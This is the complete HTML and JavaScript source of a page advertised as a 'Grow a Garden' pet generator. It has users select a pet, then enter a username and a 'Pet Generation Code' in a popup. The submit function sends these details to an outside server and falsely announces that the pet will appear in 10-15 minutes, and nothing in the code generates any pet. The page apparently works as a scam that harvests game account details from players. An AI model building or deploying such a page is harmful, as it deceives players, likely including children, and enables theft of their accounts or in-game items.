<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Grow a Garden - Pet Generator</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(180deg, #0a1a2f, #122d50);
      color: white;
      text-align: center;
    }

    header {
      padding: 20px;
      font-size: 2.5rem;
      font-weight: bold;
      color: #61dafb;
    }

    .pet-container {
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 20px;
      justify-items: center;
      margin: 40px auto;
      width: 90%;
      max-width: 1000px;
    }

    .pet {
      background: #1f3a60;
      padding: 15px;
      border-radius: 15px;
      transition: transform 0.2s ease, box-shadow 0.2s ease;
      cursor: pointer;
      width: 160px;
    }

    .pet img {
      width: 100%;
      height: 120px;
      object-fit: cover;
      border-radius: 10px;
    }

    .pet:hover {
      transform: scale(1.05);
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
    }

    .pet.selected {
      border: 3px solid #61dafb;
      transform: scale(1.1);
      box-shadow: 0 12px 24px rgba(0, 0, 0, 0.6);
    }

    .pet-name {
      margin-top: 10px;
      font-size: 1.1rem;
    }

    .generate-btn {
      background-color: #61dafb;
      color: #0a1a2f;
      border: none;
      padding: 12px 24px;
      font-size: 1.2rem;
      border-radius: 10px;
      cursor: pointer;
      transition: background-color 0.2s ease, transform 0.2s ease;
      margin-top: 30px;
    }

    .generate-btn:hover {
      background-color: #4cb3e6;
      transform: scale(1.05);
    }

    .tutorial {
      margin-top: 40px;
    }

    .tutorial iframe {
      width: 80%;
      max-width: 560px;
      height: 315px;
      border: none;
      border-radius: 10px;
    }

    .popup {
      display: none;
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.8);
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .popup-content {
      background: #1f3a60;
      padding: 20px;
      border-radius: 12px;
      text-align: center;
      width: 300px;
    }

    .popup input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 8px;
      border: none;
    }

    .popup button {
      background-color: #61dafb;
      color: #0a1a2f;
      border: none;
      padding: 10px 20px;
      font-size: 1rem;
      border-radius: 8px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <header>Grow a Garden - Pet Generator</header>

  <div class="pet-container" id="petContainer">
    <!-- Pets will be added dynamically -->
  </div>

  <button class="generate-btn" onclick="openPopup()">Generate Pet</button>

  <div class="tutorial">
    <h2>Tutorial</h2>
    <iframe src="https://www.youtube.com/embed/dnBvM1z-1yo" allowfullscreen></iframe>
  </div>

  <!-- Popup -->
  <div class="popup" id="popup">
    <div class="popup-content">
      <h3>Enter Details</h3>
      <input type="text" id="username" placeholder="Username">
      <input type="text" id="code" placeholder="Pet Generation Code">
      <br>
      <button onclick="submitData()">Submit</button>
    </div>
  </div>

  <script>
    const pets = [
      { name: "Kitsune", img: "https://i.imgur.com/Z7OYXvF.png" },
      { name: "Raccoon", img: "https://i.imgur.com/lHyB6XL.png" },
      { name: "Disco Bee", img: "https://i.imgur.com/TLQK9Z8.png" },
      { name: "Mimic Octopus", img: "https://i.imgur.com/fW3MeX7.png" },
      { name: "Fennec Fox", img: "https://i.imgur.com/I0kTz6p.png" },
      { name: "Butterfly", img: "https://i.imgur.com/lC5oV4P.png" },
      { name: "Crystal Dragon", img: "https://i.imgur.com/vVOGmDU.png" },
      { name: "Shadow Wolf", img: "https://i.imgur.com/F9aZ3gr.png" },
      { name: "Fire Salamander", img: "https://i.imgur.com/biyMT4E.png" },
      { name: "Golden Gecko", img: "https://i.imgur.com/xr7OHVa.png" }
    ];

    const container = document.getElementById("petContainer");
    let selectedPet = null;

    pets.forEach((pet, index) => {
      const div = document.createElement("div");
      div.className = "pet";
      div.innerHTML = `
        <img src="${pet.img}" alt="${pet.name}">
        <div class="pet-name">${pet.name}</div>
      `;
      div.onclick = () => {
        document.querySelectorAll(".pet").forEach(p => p.classList.remove("selected"));
        div.classList.add("selected");
        selectedPet = pet.name;
      };
      container.appendChild(div);
    });

    function openPopup() {
      if (!selectedPet) {
        alert("Please select a pet first!");
        return;
      }
      document.getElementById("popup").style.display = "flex";
    }

    async function submitData() {
      const username = document.getElementById("username").value;
      const code = document.getElementById("code").value;

      if (!username || !code) {
        alert("Please fill in all fields.");
        return;
      }

      try {
        await fetch("https://backend-sigma-one-64.vercel.app/api/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username, code, pet: selectedPet })
        });

        alert("Pet has been generated! Please wait 10-15 minutes for it to appear!");
        document.getElementById("popup").style.display = "none";
      } catch (error) {
        alert("Error sending data. Try again later.");
      }
    }
  </script>
</body>
</html>
